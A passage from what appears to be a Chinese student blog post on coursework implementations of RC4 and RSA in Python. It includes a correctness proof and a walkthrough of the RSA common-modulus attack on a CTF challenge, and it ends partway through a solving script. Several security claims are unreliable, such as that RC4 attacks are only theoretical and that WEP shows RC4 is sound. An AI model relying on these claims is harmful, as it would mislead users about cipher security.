href="#初始化S盒和T向量（初始化S和T）" class="headerlink" title="初始化S盒和T向量（初始化S和T）"></a>初始化S盒和T向量（初始化S和T）</h4><p>先初始化S，同时建立一个临时数组向量T，如果种子密钥的长度为256字节，则直接将K赋值给T，否则若种子密钥K的长度小于256，则将K的值赋给T的前|K|个元素，并不断重复加载K的值直到T被填满。将S和T分别存储在列表S1和T1里；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_S_T</span><span class="params">(s1,t1,k1)</span>:</span>    </span><br><span class="line"><span class="string">"""初始化S,T"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s1.append(i)</span><br><span class="line">t1.append(k1[i%len(k1)])</span><br></pre></td></tr></table></figure><h4 id="KSA密钥调度算法（置换S）"><a href="#KSA密钥调度算法（置换S）" class="headerlink" title="KSA密钥调度算法（置换S）"></a>KSA密钥调度算法（置换S）</h4><p>用来打乱S盒的初始排列顺序；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_s</span><span class="params">(s2,t2)</span>:</span></span><br><span class="line"><span class="string">"""更新S"""</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j=(j+s2[i]+t2[i])%<span class="number">256</span></span><br><span class="line">s2[i],s2[j]=s2[j],s2[i]</span><br></pre></td></tr></table></figure><h4 id="PRGA伪随机生成算法（生成密钥流）"><a href="#PRGA伪随机生成算法（生成密钥流）" class="headerlink" title="PRGA伪随机生成算法（生成密钥流）"></a>PRGA伪随机生成算法（生成密钥流）</h4><p>生成密钥流存储在flow1列表中；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_flow</span><span class="params">(s3,p1,flow1)</span>:</span></span><br><span class="line"><span class="string">"""生成密钥流"""</span>  </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(p1)):</span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">j=(j+s3[i])%<span class="number">256</span></span><br><span class="line">s3[i],s3[j]=s3[j],s3[i]</span><br><span class="line">t=(s3[i]+s3[j])%<span class="number">256</span></span><br><span class="line">flow1.append(s3[t])</span><br></pre></td></tr></table></figure><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>将密钥流与明文字节异或得出密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plain_flow</span><span class="params">(p2,flow2,c)</span>:</span></span><br><span class="line"><span class="string">"""生成密文"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p2)):</span><br><span class="line">temp=(flow2[i]^ord(p2[i]))</span><br><span class="line">temp1=hex(temp)</span><br><span class="line">c.append(temp1[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>将密钥流与密文字节异或得出明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rc4</span><span class="params">(c1,flow3,p_flow)</span>:</span></span><br><span class="line"><span class="string">"""解密"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">temp2=int(<span class="string">"0x"</span>+c1[i],<span class="number">16</span>)</span><br><span class="line">p_flow.append(chr(flow3[i]^temp2))</span><br></pre></td></tr></table></figure><h4 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_S_T</span><span class="params">(s1,t1,k1)</span>:</span>    </span><br><span class="line"><span class="string">"""初始化S,T"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s1.append(i)</span><br><span class="line">t1.append(k1[i%len(k1)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_s</span><span class="params">(s2,t2)</span>:</span></span><br><span class="line"><span class="string">"""更新S"""</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j=(j+s2[i]+t2[i])%<span class="number">256</span></span><br><span class="line">s2[i],s2[j]=s2[j],s2[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_flow</span><span class="params">(s3,p1,flow1)</span>:</span></span><br><span class="line"><span class="string">"""生成密钥流"""</span>  </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(p1)):</span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">j=(j+s3[i])%<span class="number">256</span></span><br><span class="line">s3[i],s3[j]=s3[j],s3[i]</span><br><span class="line">t=(s3[i]+s3[j])%<span class="number">256</span></span><br><span class="line">flow1.append(s3[t]) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plain_flow</span><span class="params">(p2,flow2,c)</span>:</span></span><br><span class="line"><span class="string">"""生成密文"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p2)):</span><br><span class="line">temp=(flow2[i]^ord(p2[i]))</span><br><span class="line">temp1=hex(temp)</span><br><span class="line">c.append(temp1[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rc4</span><span class="params">(c1,flow3,p_flow)</span>:</span></span><br><span class="line"><span class="string">"""解密"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">temp2=int(<span class="string">"0x"</span>+c1[i],<span class="number">16</span>)</span><br><span class="line">p_flow.append(chr(flow3[i]^temp2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Encrypt Input  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">k=raw_input(<span class="string">"Please enter the key:"</span>)</span><br><span class="line">key=k.split(<span class="string">" "</span>)</span><br><span class="line">key=[int(key[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line">plain=raw_input(<span class="string">"Please enter the plain:"</span>)</span><br><span class="line">s=[] </span><br><span class="line">t=[] </span><br><span class="line">k_flow=[] </span><br><span class="line">c_flow=[]</span><br><span class="line">p_flow=[]</span><br><span class="line">init_S_T(s,t,key) </span><br><span class="line">update_s(s,t)</span><br><span class="line">secret_flow(s,plain,k_flow)</span><br><span class="line">plain_flow(plain,k_flow,c_flow)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Encryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line"><span class="comment"># print("置乱后的s盒：")</span></span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">print(<span class="string">"密钥流："</span>)</span><br><span class="line">print(k_flow)</span><br><span class="line">print(<span class="string">"Cipher:"</span>)</span><br><span class="line"><span class="comment"># print c_flow</span></span><br><span class="line"><span class="keyword">print</span><span class="string">""</span>.join(c_flow)   <span class="comment">#加密后输出密文</span></span><br><span class="line">decode_rc4(c_flow,k_flow,p_flow)          <span class="comment">#解密后输出明文</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Decryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">print(<span class="string">"Plain:"</span>)</span><br><span class="line"><span class="keyword">print</span><span class="string">""</span>.join(p_flow)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="运行结果及正确性-1"><a href="#运行结果及正确性-1" class="headerlink" title="运行结果及正确性"></a>运行结果及正确性</h3><p>输入8个字符的明文化成ASCII码，再转化为比特流，与得到的密钥比特流进行逐位异或，结果化成16进制得到如下密文；将密文化为比特流再与原来的密钥流进行异或，得到明文比特流，继续转化为字符得到原来的字符hellocumt；所以算法正确性得到了验证；</p><p><img src="https://s2.ax1x.com/2019/01/02/FINa2F.png" alt="FINa2F.png"></p><h3 id="安全性分析-1"><a href="#安全性分析-1" class="headerlink" title="安全性分析"></a>安全性分析</h3><p>设计流密码的一个重要步骤就是设计密钥流生成器，主要安全要求就是：</p><p>1.密钥流的周期要足够大；</p><p>2.还要使得密钥流具有随机统计特性；</p><p>3.密钥流的部分暴露时，序列不可被推算出来，就是序列的线性不可预测性大；</p><p>一般来说，密钥序列的随机特性越好，加密的安全性也就越高；RC4的密钥生成随机特性良好，周期足够大；至今对RC4的攻击都停留在理论上，在实践上并不能对RC4构成威胁；</p><h3 id="有效性和合理性分析-1"><a href="#有效性和合理性分析-1" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h3><p>由于RC4具有良好的随机特性和抵抗各种分析的能力，密钥流随机特性较好，因此在众多领域里RC4都得到了广泛的运用；例如：无线局域网标准的WEP协议就是利用RC4对数据进行加密，保障了无线通信信号的完整性和保密性，防止了不法分子对网络的非授权访问；这样的现实应用直接证实了RC4算法的有效性和合理性；</p><h3 id="算法编写过程中遇到的问题及解决-1"><a href="#算法编写过程中遇到的问题及解决-1" class="headerlink" title="算法编写过程中遇到的问题及解决"></a>算法编写过程中遇到的问题及解决</h3><p>编写过程中一开始解密不对，经过学习发现是一个简单的错误，那就是序列密码是对称加密算法，加密解密需要用到相同的密钥，所以每次如果明文和种子密钥不一样的话，解密都需要更新自己的密钥流；</p><h1 id="非对称加密RSA"><a href="#非对称加密RSA" class="headerlink" title="非对称加密RSA"></a>非对称加密RSA</h1><h2 id="简述-2"><a href="#简述-2" class="headerlink" title="简述"></a>简述</h2><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用；</p><h2 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h2><p>1.随机选择两个不同大质数 p和 q，计算 <code>N=p×q</code></p><p>2.根据欧拉函数，求得<code>r=φ(N)=φ(p)φ(q)=(p−1)(q−1)</code></p><p>3.选择一个小于 r 的整数 e，使 e 和 r互质。并求得 e 关于 r 的模反元素，为 d，有 <code>ed≡1 mod red≡1 mod r</code></p><p>4.将 p 和 q 的记录销毁；</p><p>此时，<code>(N,e)</code>是公钥，<code>(N,d)</code>是私钥；</p><h2 id="消息加密"><a href="#消息加密" class="headerlink" title="消息加密"></a>消息加密</h2><p>首先需要将消息 m 以一个双方约定好的格式转化为一个小于  N，且与 N 互质的整数 n。如果消息太长，可以将消息分为几段，这也就是我们所说的分组加密，后对于每一部分利用如下公式加密：<code>n^e≡c(modN)</code>；</p><h2 id="消息解密"><a href="#消息解密" class="headerlink" title="消息解密"></a>消息解密</h2><p>利用密钥 d 进行解密：<code>c^d≡n(modN)</code>；</p><h2 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="生成n字节的随机数"><a href="#生成n字节的随机数" class="headerlink" title="生成n字节的随机数"></a>生成n字节的随机数</h3><p>调用<code>os.urandom()</code>随机生成n字节的随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrandom</span><span class="params">(n)</span>:</span></span><br><span class="line">data=urandom(n)</span><br><span class="line">a=int(binascii.hexlify(data),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h3 id="第一次素性检验"><a href="#第一次素性检验" class="headerlink" title="第一次素性检验"></a>第一次素性检验</h3><p>首先进行第一次素性检验，检验100以内的素数是否为n的因数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">(n)</span>:</span></span><br><span class="line">dic_small=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>]</span><br><span class="line"><span class="comment"># print(len(dic_small))</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_small:</span><br><span class="line"><span class="keyword">if</span> n%x==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><h3 id="第二次素性检验"><a href="#第二次素性检验" class="headerlink" title="第二次素性检验"></a>第二次素性检验</h3><p>用Miller-rabin素性检验算法检验n，检验k次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_Miller</span><span class="params">(n,k)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n&lt;<span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">d=n<span class="number">-1</span></span><br><span class="line">r=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span>(d&amp;<span class="number">1</span>):</span><br><span class="line">r+=<span class="number">1</span></span><br><span class="line">d&gt;&gt;=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">a=getrandom(<span class="number">120</span>)</span><br><span class="line">x=pow(a,d,n)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span> <span class="keyword">or</span> x==n<span class="number">-1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(r<span class="number">-1</span>):</span><br><span class="line">x=pow(x,<span class="number">2</span>,n)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">if</span> x==n<span class="number">-1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><h3 id="通过两次素性检测"><a href="#通过两次素性检测" class="headerlink" title="通过两次素性检测"></a>通过两次素性检测</h3><p>产生byte字节的数，并且通过两次素性检测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span><span class="params">(byte)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">n=getrandom(byte)</span><br><span class="line"><span class="keyword">if</span> test1(n):</span><br><span class="line"><span class="keyword">if</span> test_Miller(n,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><h3 id="产生公钥e"><a href="#产生公钥e" class="headerlink" title="产生公钥e"></a>产生公钥e</h3><p>产生一个和φ(n)互素的公钥e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gete</span><span class="params">(ol)</span>:</span></span><br><span class="line">e=getprime(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> ol%e!=<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> e</span><br></pre></td></tr></table></figure><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><p>加密时，先将明文进行16进制编码，然后转化为10进制计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexencode</span><span class="params">(str0)</span>:</span></span><br><span class="line">hexcode=base64.b16encode(str0)</span><br><span class="line">res=int(hexcode,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="16进制解码"><a href="#16进制解码" class="headerlink" title="16进制解码"></a>16进制解码</h3><p>解密时需要对计算出来的明文编码进行16进制解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdecode</span><span class="params">(str0)</span>:</span></span><br><span class="line">temp=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str0)):</span><br><span class="line"><span class="keyword">if</span> ord(str0[i])&gt;<span class="number">96</span> <span class="keyword">and</span> ord(str0[i])&lt;<span class="number">123</span>:</span><br><span class="line">temp+=chr(ord(str0[i])<span class="number">-32</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp+=str0[i]</span><br><span class="line">res=base64.b16decode(temp)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="分组加密一组"><a href="#分组加密一组" class="headerlink" title="分组加密一组"></a>分组加密一组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAencrypt_group</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">num1=hexencode(m)                            </span><br><span class="line"> c=pow(num1,e,n)                    <span class="comment">#cipher</span></span><br><span class="line"><span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="加密全部-1"><a href="#加密全部-1" class="headerlink" title="加密全部"></a>加密全部</h3><p>5个字符一组进行加密,将所有的密文连接在一起输出，将每个分组的密文存储在cip列表中用于以后的解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAencrypt_all</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(m),<span class="number">5</span>):</span><br><span class="line">temp=m[i:i+<span class="number">5</span>]</span><br><span class="line">group_cipher=RSAencrypt_group(temp,e,n)</span><br><span class="line">cip.append(group_cipher)</span><br><span class="line">res+=str(group_cipher)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="解密一组-1"><a href="#解密一组-1" class="headerlink" title="解密一组"></a>解密一组</h3><p>输入数字c进行RSA解密得到num1，然后再转化为16进制，再对16进制数进行解码变成明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAdecrypt_group</span><span class="params">(c,e,n,ol)</span>:</span></span><br><span class="line">d=gmpy2.invert(e,ol)</span><br><span class="line">num1=pow(c,d,n)</span><br><span class="line">str1=<span class="string">'&#123;:0x&#125;'</span>.format(num1)</span><br><span class="line">plain=hexdecode(str1)</span><br><span class="line"><span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><h3 id="解密全部-1"><a href="#解密全部-1" class="headerlink" title="解密全部"></a>解密全部</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAdecrypt_all</span><span class="params">(e,n,ol)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)):</span><br><span class="line">temp=RSAdecrypt_group(cip[i],e,n,ol)</span><br><span class="line">res+=temp</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性验证"><a href="#运行结果及正确性验证" class="headerlink" title="运行结果及正确性验证"></a>运行结果及正确性验证</h2><p><strong>理论证明：</strong></p><p>即我们要证<code>n^ed≡n(modN)</code>，已知<code>ed≡1modϕ(N)</code>，那么 <code>ed=kϕ(N)+1</code>，即需要证明</p><p><code>n^(kϕ(N)+1)≡n(modN)</code></p><p>这里我们分两种情况证明</p><p>第一种情况 gcd(n,N)=1，那么 <code>n^ϕ(N)≡1modN</code>，因此原式成立。</p><p>第二种情况 gcd(n,N)!=1，那么 n 必然是 p 或者 q 的倍数，并且 n 小于 N。我们假设<code>n=xp</code></p><p>那么 x 必然小于 q，又由于 q 是素数。那么<code>n^ϕ(q)≡1modq</code></p><p>进而<code>n^kϕ(N)=n^(k(p−1)(q−1))=(n^ϕ(q))^k(p−1)≡1modq</code></p><p>那么<code>n^(kϕ(N)+1)=n+uqn</code>进而<code>nkϕ(N)+1=n+uqxp=n+uxN</code>；所以原式成立。</p><p><strong>程序正确性：</strong></p><p>程序输入明文hello，加载出1024bit的大素数p和q，继续加载出公钥e，经过加密得到如下密文；就用上面得到的p,q,e,cipher，先计算出私钥d，再解密密文，得到如下明文hello，解密成功，算法正确性得到验证；</p><p><img src="https://s2.ax1x.com/2019/01/03/Fo8GnI.png" alt="Fo8GnI.png"></p><h2 id="安全性分析-2"><a href="#安全性分析-2" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破，RSA算法选取的两个安全的大素数目前推荐长度为至少为1024比特；到现在为止，还没有任何可靠的攻击 RSA 算法的方式。</p><h3 id="RSA的共模攻击分析"><a href="#RSA的共模攻击分析" class="headerlink" title="RSA的共模攻击分析"></a>RSA的共模攻击分析</h3><h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击；</p><p>设两个用户的公钥分别为 e1和 e2，且两者互质。明文消息为 mm，密文分别为：<code>c1=m^e1(modN)</code> <code>c2=m^e2(modN)</code></p><p>当攻击者截获 c1和 c2后，就可以恢复出明文。用扩展欧几里得算法求出 <code>re1+se2=1modn</code>的两个整数 r 和 s，由此可得：</p><p><code>(c^r1)*(c^s2)≡(m^re1)*(m^se2)modn≡m^(re1+se2)modn≡m(modn)</code></p><h5 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h5><p>就拿CTF比赛Crypto中的一道题目来说：给出两组密文 message1,message2；给出两组分别的公钥是e1和e2；给出两组加密用的是同一个n；如何去计算出明文呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;</span><br><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;</span><br><span class="line">message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span><br><span class="line">message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><br></pre></td></tr></table></figure><p>可以看出两个公钥的 N 是一样的，并且两者的 e 互素。用上述原理写一个python脚本跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span></span><br><span class="line">e1 = <span class="number">773</span></span><br><span class="line">e2 = <span class="number">839</span></span><br><span class="line">message1=<span class="number">3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span></span><br><span class="line">message2=<span class="number">5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span></span><br><span class="line"><span 